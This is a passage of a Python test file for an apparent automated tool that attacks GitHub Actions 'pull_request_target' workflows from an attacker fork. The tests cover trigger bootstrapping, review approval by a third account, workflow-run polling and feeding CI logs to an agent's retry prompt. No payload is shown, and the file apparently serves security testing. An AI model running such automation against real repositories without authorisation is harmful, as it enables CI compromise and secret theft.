        if self.pull_request_calls == 1:
            return {"head": {"sha": "oldsha"}}
        return {"head": {"sha": "newsha"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.workflow_runs_calls += 1
        run_status = "in_progress" if self.workflow_runs_calls < 3 else "completed"
        return {
            "workflow_runs": [
                {
                    "id": 100,
                    "head_sha": "oldsha",
                    "status": run_status,
                    "conclusion": "success" if run_status == "completed" else None,
                    "pull_requests": [{"number": 42}],
                }
            ]
        }


def test_wait_for_workflow_runs_falls_back_when_no_new_run_after_head_sha_change(
    monkeypatch,
) -> None:
    current_time = {"value": 0.0}

    def _fake_time() -> float:
        return current_time["value"]

    def _fake_sleep(seconds: float) -> None:
        current_time["value"] += seconds

    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.time", _fake_time)
    monkeypatch.setattr(
        "pwn_hunter_ai.attack.execution_service.time.sleep", _fake_sleep
    )
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _HeadShaNoNewWorkflowClient()

    result = service._wait_for_workflow_runs(  # noqa: SLF001
        client=client,
        repo_name="owner/repo",
        head_sha="oldsha",
        pr_number=42,
        deadline=300.0,
        poll_interval=30.0,
        focused_workflow=None,
    )

    assert result["timed_out"] is False
    assert sorted(result["runs_by_id"].keys()) == [100]


class _IgnoredHeadShaSwitchingClient:
    def __init__(self) -> None:
        self.pull_request_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        self.pull_request_calls += 1
        if self.pull_request_calls == 1:
            return {"head": {"sha": "sha-bootstrap"}}
        return {"head": {"sha": "sha-gha"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        return {
            "workflow_runs": [
                {
                    "id": 303,
                    "head_sha": "sha-gha",
                    "status": "completed",
                    "conclusion": "success",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }


def test_wait_for_workflow_runs_ignores_bootstrap_head_sha_but_tracks_later_sha(
    monkeypatch,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _IgnoredHeadShaSwitchingClient()

    result = service._wait_for_workflow_runs(  # noqa: SLF001
        client=client,
        repo_name="owner/repo",
        head_sha="sha-exploit",
        pr_number=42,
        deadline=time.time() + 5,
        poll_interval=0.01,
        focused_workflow=None,
        ignored_head_shas=["sha-bootstrap"],
    )

    assert result["timed_out"] is False
    assert sorted(result["runs_by_id"].keys()) == [303]
    assert result["head_sha_changes"] == [{"from": "sha-exploit", "to": "sha-gha"}]


def test_download_and_extract_logs_includes_files_with_error_marker() -> None:
    class _LogZipClient:
        def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
            _ = (repo_name, run_id)
            buffer = io.BytesIO()
            with zipfile.ZipFile(
                buffer, mode="w", compression=zipfile.ZIP_DEFLATED
            ) as zf:
                zf.writestr("1_Set up job.txt", "ok line\nanother ok line")
                zf.writestr(
                    "2_Checkout.txt",
                    "step output\n##[error]Process completed with exit code 1.",
                )
                zf.writestr("3_Set up JDK 17.txt", "warn\n##[warning]be careful")
                zf.writestr(
                    "4_Spotless check.txt",
                    "some output\nerror happened\n##[error]spotless failed",
                )
                zf.writestr("system.txt", "")
            return buffer.getvalue()

    service = AttackExecutionService(github_client_factory=lambda _token: object())
    extracted = service._download_and_extract_logs(  # noqa: SLF001
        _LogZipClient(),
        "owner/repo",
        123,
    )

    assert "=== 2_Checkout.txt ===" in extracted
    assert "=== 4_Spotless check.txt ===" in extracted
    assert "=== 1_Set up job.txt ===" not in extracted
    assert "=== 3_Set up JDK 17.txt ===" not in extracted
    assert "=== system.txt ===" not in extracted


def test_download_and_extract_logs_ignores_error_not_on_last_line() -> None:
    class _LogZipClient:
        def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
            _ = (repo_name, run_id)
            buffer = io.BytesIO()
            with zipfile.ZipFile(
                buffer, mode="w", compression=zipfile.ZIP_DEFLATED
            ) as zf:
                zf.writestr(
                    "12_Post Checkout.txt",
                    "##[error]temporary failure\nRecovered and completed",
                )
                zf.writestr(
                    "13_Complete job.txt",
                    "all done\n##[error]final failure",
                )
            return buffer.getvalue()

    service = AttackExecutionService(github_client_factory=lambda _token: object())
    extracted = service._download_and_extract_logs(  # noqa: SLF001
        _LogZipClient(),
        "owner/repo",
        456,
    )

    assert "=== 12_Post Checkout.txt ===" in extracted
    assert "=== 13_Complete job.txt ===" in extracted


def test_download_and_extract_logs_includes_error_not_on_last_line_in_generic_job_log() -> None:
    class _LogZipClient:
        def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
            _ = (repo_name, run_id)
            buffer = io.BytesIO()
            with zipfile.ZipFile(
                buffer, mode="w", compression=zipfile.ZIP_DEFLATED
            ) as zf:
                zf.writestr(
                    "0_build (3.12).txt",
                    "\n".join(
                        [
                            "2026-03-27T14:01:29.7253975Z ##[group]Run google-github-actions/setup-gcloud",
                            "2026-03-27T14:01:29.7253975Z ##[error]google-github-actions/setup-gcloud failed with: failed to execute command",
                            "2026-03-27T14:01:29.7508203Z Post job cleanup.",
                        ]
                    ),
                )
            return buffer.getvalue()

    service = AttackExecutionService(github_client_factory=lambda _token: object())
    extracted = service._download_and_extract_logs(  # noqa: SLF001
        _LogZipClient(),
        "owner/repo",
        789,
    )

    assert "=== 0_build (3.12).txt ===" in extracted
    assert "##[error]google-github-actions/setup-gcloud failed with: failed to execute command" in extracted


def test_download_and_extract_logs_with_files_writes_workspace_files(tmp_path: Path) -> None:
    class _LogZipClient:
        def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
            _ = (repo_name, run_id)
            buffer = io.BytesIO()
            with zipfile.ZipFile(
                buffer, mode="w", compression=zipfile.ZIP_DEFLATED
            ) as zf:
                zf.writestr(
                    "job/2_Checkout.txt",
                    "checkout output\n##[error]checkout failed",
                )
                zf.writestr(
                    "job/13_Complete job.txt",
                    "complete output\n##[error]job failed",
                )
                zf.writestr("job/system.txt", "system output\nall good")
            return buffer.getvalue()

    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)

    extracted, log_files = service._download_and_extract_logs_with_files(  # noqa: SLF001
        client=_LogZipClient(),
        repo_name="owner/repo",
        run_id=42,
        workspace_path=workspace_path,
        attempt=2,
    )

    assert "=== job/2_Checkout.txt ===" in extracted
    assert "=== job/13_Complete job.txt ===" in extracted
    assert "=== job/system.txt ===" not in extracted
    assert log_files == [
        ".pwnhunter-workflow-logs/attempt-2/run-42/job__2_Checkout.txt",
        ".pwnhunter-workflow-logs/attempt-2/run-42/job__13_Complete job.txt",
    ]
    assert (
        workspace_path / log_files[0]
    ).read_text(encoding="utf-8").endswith("##[error]checkout failed")
    assert (
        workspace_path / log_files[1]
    ).read_text(encoding="utf-8").endswith("##[error]job failed")


def test_append_required_path_filter_guidance_appends_once(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    prompt_path = tmp_path / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")

    service._append_required_path_filter_guidance(  # noqa: SLF001
        prompt_path=prompt_path,
        required_path_filters=["sdk/python/**", "", " docs/** "],
    )
    first_render = prompt_path.read_text(encoding="utf-8")
    assert "## Pull Request Path Filter Requirements" in first_render
    assert "- sdk/python/**" in first_render
    assert "- docs/**" in first_render

    service._append_required_path_filter_guidance(  # noqa: SLF001
        prompt_path=prompt_path,
        required_path_filters=["sdk/python/**"],
    )
    second_render = prompt_path.read_text(encoding="utf-8")
    assert (
        second_render.count("## Pull Request Path Filter Requirements") == 1
    )


def test_select_required_path_filter_trigger_path_prefers_exact_path() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())

    trigger_path, is_exact = service._select_required_path_filter_trigger_path(  # noqa: SLF001
        required_path_filters=["assets/pricing.json", "docs/**"],
    )

    assert trigger_path == "assets/pricing.json"
    assert is_exact is True


def test_ensure_required_path_filter_change_updates_exact_json_file(
    monkeypatch,
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    pricing_path = tmp_path / "assets" / "pricing.json"
    pricing_path.parent.mkdir(parents=True, exist_ok=True)
    pricing_path.write_text('{"plan":"free"}', encoding="utf-8")

    checks = iter([False, True])
    monkeypatch.setattr(
        service,
        "_workspace_file_has_git_diff",
        lambda **kwargs: next(checks),
    )

    ok, reason = service._ensure_required_path_filter_change(  # noqa: SLF001
        workspace_path=tmp_path,
        required_path_filters=["assets/pricing.json"],
    )

    assert ok is True
    assert reason is None
    assert json.loads(pricing_path.read_text(encoding="utf-8")) == {"plan": "free"}
    assert pricing_path.read_text(encoding="utf-8").endswith("\n")


def test_ensure_required_path_filter_change_recreates_deleted_trigger_file(
    monkeypatch,
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    trigger_path = tmp_path / "docs" / "pwnhunter-trigger"

    checks = iter([False, False])
    monkeypatch.setattr(
        service,
        "_workspace_file_has_git_diff",
        lambda **kwargs: next(checks),
    )

    first_ok, first_reason = service._ensure_required_path_filter_change(  # noqa: SLF001
        workspace_path=tmp_path,
        required_path_filters=["docs/**"],
    )
    assert first_ok is True
    assert first_reason is None
    assert trigger_path.exists()

    trigger_path.unlink()

    second_ok, second_reason = service._ensure_required_path_filter_change(  # noqa: SLF001
        workspace_path=tmp_path,
        required_path_filters=["docs/**"],
    )
    assert second_ok is True
    assert second_reason is None
    assert trigger_path.exists()


def test_retry_with_logs_prompt_lists_available_log_files(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")
    log_file_1 = workspace_path / ".pwnhunter-workflow-logs/attempt-1/run-1001/2_Checkout.txt"
    log_file_2 = (
        workspace_path / ".pwnhunter-workflow-logs/attempt-1/run-1001/4_Spotless check.txt"
    )
    log_file_1.parent.mkdir(parents=True, exist_ok=True)
    log_file_1.write_text("checkout line\n##[error]checkout failed", encoding="utf-8")
    log_file_2.write_text("spotless line\n##[error]spotless failed", encoding="utf-8")

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[
            {
                "attempt": 1,
                "run_id": 1001,
                "conclusion": "failure",
                "log_files": [
                    ".pwnhunter-workflow-logs/attempt-1/run-1001/2_Checkout.txt",
                    ".pwnhunter-workflow-logs/attempt-1/run-1001/4_Spotless check.txt",
                ],
            }
        ],
        attempt=1,
    )

    assert retried is True
    prompt = prompt_path.read_text(encoding="utf-8")
    assert "which logs" not in prompt.lower()
    assert "Available error-related log files" in prompt
    assert ".pwnhunter-workflow-logs/attempt-1/run-1001/2_Checkout.txt" in prompt
    assert ".pwnhunter-workflow-logs/attempt-1/run-1001/4_Spotless check.txt" in prompt
    assert "Error-related log file contents" in prompt
    assert "=== .pwnhunter-workflow-logs/attempt-1/run-1001/2_Checkout.txt ===" in prompt
    assert "##[error]checkout failed" in prompt
    assert "=== .pwnhunter-workflow-logs/attempt-1/run-1001/4_Spotless check.txt ===" in prompt
    assert "##[error]spotless failed" in prompt


def test_retry_with_logs_prompt_truncates_large_log_files(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")
    log_path = workspace_path / ".pwnhunter-workflow-logs/attempt-1/run-2002/2_Run tests.txt"
    log_path.parent.mkdir(parents=True, exist_ok=True)
    log_content = ("C" * 1000) + ("MIDDLE" * 100) + ("E" * 10000)
    log_path.write_text(log_content, encoding="utf-8")
    relative_log_path = ".pwnhunter-workflow-logs/attempt-1/run-2002/2_Run tests.txt"

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[
            {
                "attempt": 1,
                "run_id": 2002,
                "conclusion": "failure",
                "log_files": [relative_log_path],
            }
        ],
        attempt=1,
    )

    assert retried is True
    prompt = prompt_path.read_text(encoding="utf-8")
    assert "C" * 1000 in prompt
    assert "MIDDLE" not in prompt
    assert "[... middle of log omitted (600 characters removed) ...]" in prompt
    assert "Some details between the command start and error output may be missing." in prompt
    assert f"Read the full log at `{relative_log_path}` if you need the omitted middle." in prompt
    assert "E" * 200 in prompt


def test_retry_with_logs_prompt_includes_only_current_attempt_logs(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[
            {"attempt": 1, "run_id": 111, "conclusion": "failure", "logs": "old error"},
            {"attempt": 2, "run_id": 222, "conclusion": "failure", "logs": "latest error"},
        ],
        attempt=2,
    )

    assert retried is True
    prompt = prompt_path.read_text(encoding="utf-8")
    assert "Attempt 1, run 111" not in prompt
    assert "old error" not in prompt
    assert "Attempt 2, run 222" in prompt
    assert "latest error" in prompt


def test_retry_with_logs_prompt_mentions_head_sha_changes(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    sandbox = _FakeSandbox()
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    prompt_path = workspace_path.parent / "agent-task.md"
    prompt_path.write_text("initial prompt\n", encoding="utf-8")

    retried = service._retry_with_logs(  # noqa: SLF001
        workspace_path=workspace_path,
        sandbox=sandbox,
        client=object(),  # unused in retry flow
        repo_name="owner/repo",
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        previous_logs=[
            {"attempt": 1, "run_id": 111, "conclusion": "failure", "logs": "error"}
        ],
        attempt=1,
        pr_head_sha_changes=[{"from": "abc123", "to": "def456"}],
    )

    assert retried is True
    prompt = prompt_path.read_text(encoding="utf-8")
    assert "FYI: The PR head commit changed while workflow monitoring was running" in prompt
    assert "abc123 -> def456" in prompt
    assert "git log --oneline --decorate -n 20" in prompt


def test_build_pull_request_target_trigger_plan_prioritizes_synchronize() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())

    plan = service._build_pull_request_target_trigger_plan(  # noqa: SLF001
        types_explicit=True,
        workflow_types=["opened", "synchronize", "labeled"],
    )

    assert plan["mode"] == "explicit_actionable"
    assert plan["actionable_types"] == ["synchronize", "opened"]
    assert plan["non_actionable_types"] == ["labeled"]


def test_execute_attack_requires_human_review_for_non_actionable_explicit_types(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [labeled]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["controller_signal"]["source"] == (
        "workflow_pr_target_types_non_actionable_only"
    )
    assert user_b_client.created_pr_payload is None


def test_execute_attack_allows_opened_with_non_actionable_labeled_type(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [opened, labeled]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert user_b_client.created_pr_payload is not None


class _CommitMessageSandbox(_ExecuteSandbox):
    def __init__(self) -> None:
        super().__init__()
        self.commit_messages: list[str] = []

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        if len(args) >= 3 and args[0] == "commit" and args[1] == "-m":
            self.commit_messages.append(args[2])
        return super().run_git(args, check=check)


class _CommitMessageAndHeadSandbox(_CommitMessageSandbox):
    def __init__(self) -> None:
        super().__init__()
        self._commit_count = 0

    def run_git(
        self, args: list[str], *, check: bool = True
    ) -> subprocess.CompletedProcess:
        if len(args) >= 3 and args[0] == "commit" and args[1] == "-m":
            self._commit_count += 1
        if args[:2] == ["rev-parse", "HEAD"]:
            return subprocess.CompletedProcess(
                args,
                0,
                stdout=f"sha-{self._commit_count}\n",
                stderr="",
            )
        return super().run_git(args, check=check)


def test_execute_attack_bootstraps_synchronize_when_opened_missing(
    tmp_path: Path,
) -> None:
    sandbox = _CommitMessageAndHeadSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    captured_monitor_kwargs: dict[str, object] = {}

    def _fake_monitor_workflow(**kwargs):
        captured_monitor_kwargs.update(kwargs)
        return {"vulnerable": False}

    service._monitor_workflow = _fake_monitor_workflow  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [synchronize]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert "Bootstrap synchronize trigger PR" in sandbox.commit_messages
    assert "Add temporary change" in sandbox.commit_messages
    assert user_b_client.created_pr_payload is not None
    assert captured_monitor_kwargs["preferred_head_sha"] == "sha-2"
    assert "lock_to_preferred_head_sha" not in captured_monitor_kwargs
    assert captured_monitor_kwargs["ignored_head_shas"] == ["sha-1"]


def test_execute_attack_does_not_bootstrap_when_opened_and_synchronize_present(
    tmp_path: Path,
) -> None:
    sandbox = _CommitMessageSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [opened, synchronize]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert "Bootstrap synchronize trigger PR" not in sandbox.commit_messages
    assert "Add temporary change" in sandbox.commit_messages


def test_execute_attack_bootstraps_when_synchronize_present_without_opened(
    tmp_path: Path,
) -> None:
    sandbox = _CommitMessageSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [synchronize, reopened]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert "Bootstrap synchronize trigger PR" in sandbox.commit_messages
    assert "Add temporary change" in sandbox.commit_messages


class _MappedLoginExecuteGitHubClient(_ExecuteGitHubClient):
    def __init__(self, token: str, login_by_token: dict[str, str]) -> None:
        super().__init__(token)
        self._login_by_token = login_by_token

    def get_authenticated_user(self) -> dict[str, str]:
        return {"login": self._login_by_token[self.token]}


def test_execute_attack_review_requested_uses_third_user_token(tmp_path: Path) -> None:
    login_by_token = {
        "token-a": "user-a",
        "token-b": "user-b",
        "token-c": "reviewer-c",
    }
    clients = {
        token: _MappedLoginExecuteGitHubClient(token, login_by_token)
        for token in login_by_token
    }
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: clients[token],
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [review_requested]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
        user_b_reviewer_tokens=["token-a", "token-b", "token-c"],
    )

    assert result["vulnerable"] is False
    assert clients["token-b"].requested_reviewers == [["reviewer-c"], ["reviewer-c"]]
    assert clients["token-c"].created_reviews
    assert clients["token-c"].created_reviews[0]["event"] == "APPROVE"


def test_execute_attack_review_requested_without_third_user_escalates_human_review(
    tmp_path: Path,
) -> None:
    login_by_token = {
        "token-a": "user-a",
        "token-b": "user-b",
    }
    clients = {
        token: _MappedLoginExecuteGitHubClient(token, login_by_token)
        for token in login_by_token
    }
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: clients[token],
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [review_requested]\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
        user_b_reviewer_tokens=["token-a", "token-b"],
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["controller_signal"]["source"] == (
        "workflow_pr_target_trigger_application_failed"
    )


class _OpenedRetryMonitorClient:
    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}


class _PrFetchEventuallyVisibleMonitorClient:
    def __init__(self) -> None:
        self.pull_fetch_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = repo_name
        self.pull_fetch_calls += 1
        if self.pull_fetch_calls < 3:
            raise GitHubApiError(
                f"GitHub API request failed for /repos/{repo_name}/pulls/{pull_number}: 404 Not Found"
            )
        return {"number": pull_number, "head": {"sha": "abc123"}}


class _PrFetchPersistent404MonitorClient:
    def __init__(self, remap_number: int | None = None) -> None:
        self.remap_number = remap_number
        self.pull_fetch_calls: list[int] = []

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = repo_name
        self.pull_fetch_calls.append(pull_number)
        if self.remap_number is not None and pull_number == self.remap_number:
            return {"number": pull_number, "head": {"sha": "abc123"}}
        raise GitHubApiError(
            f"GitHub API request failed for /repos/{repo_name}/pulls/{pull_number}: 404 Not Found"
        )

    def list_pull_requests(
        self,
        repo_name: str,
        state: str = "open",
        head: str | None = None,
        base: str | None = None,
    ) -> list[dict[str, object]]:
        _ = (repo_name, state, head, base)
        if self.remap_number is None:
            return []
        return [{"number": self.remap_number}]


def test_monitor_workflow_retries_transient_pr_fetch_404_before_monitoring(
    monkeypatch,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_ExecuteHookbinClient(),
    )
    service._wait_for_workflow_runs = lambda **kwargs: {  # type: ignore[method-assign]
        "runs_by_id": {
            1: {
                "id": 1,
                "head_sha": "abc123",
                "status": "completed",
                "conclusion": "failure",
                "path": ".github/workflows/ci.yml@main",
            }
        },
        "timed_out": False,
    }
    service._download_and_extract_logs_with_files = (  # type: ignore[method-assign]
        lambda **kwargs: ("", [])
    )

    client = _PrFetchEventuallyVisibleMonitorClient()
    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=Path("."),
        sandbox=_FakeSandbox(),  # type: ignore[arg-type]
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        focused_workflow=".github/workflows/ci.yml",
        workflow_timeout=5,
    )

    assert client.pull_fetch_calls >= 3
    assert result["vulnerable"] is False
    assert result.get("status") != "execution_error"


def test_monitor_workflow_returns_execution_error_when_pr_never_visible_after_create(
    monkeypatch,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_ExecuteHookbinClient(),
    )
    client = _PrFetchPersistent404MonitorClient(remap_number=None)

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=Path("."),
        sandbox=_FakeSandbox(),  # type: ignore[arg-type]
        branch_name="feature/test",
        user_b_login="user-b",
        default_branch="main",
        workflow_timeout=5,
        pr_head_ref="attacker:feature/test",
        pr_base_ref="main",
    )

    assert result["status"] == "execution_error"
    assert result["error_class"] == "pr_not_visible_after_create"
    assert result["failure_fingerprint"] == "pr_fetch_404_after_create"


def test_monitor_workflow_remaps_pr_number_after_persistent_initial_404(
    monkeypatch,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_ExecuteHookbinClient(),
    )
    observed_pr_numbers: list[int] = []

    def _fake_wait_for_runs(**kwargs):
        observed_pr_numbers.append(kwargs["pr_number"])
        return {
            "runs_by_id": {
                1: {
                    "id": 1,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "path": ".github/workflows/ci.yml@main",
                }
            },
            "timed_out": False,
        }

    service._wait_for_workflow_runs = _fake_wait_for_runs  # type: ignore[method-assign]
    service._download_and_extract_logs_with_files = (  # type: ignore[method-assign]
        lambda **kwargs: ("", [])
    )
    client = _PrFetchPersistent404MonitorClient(remap_number=77)

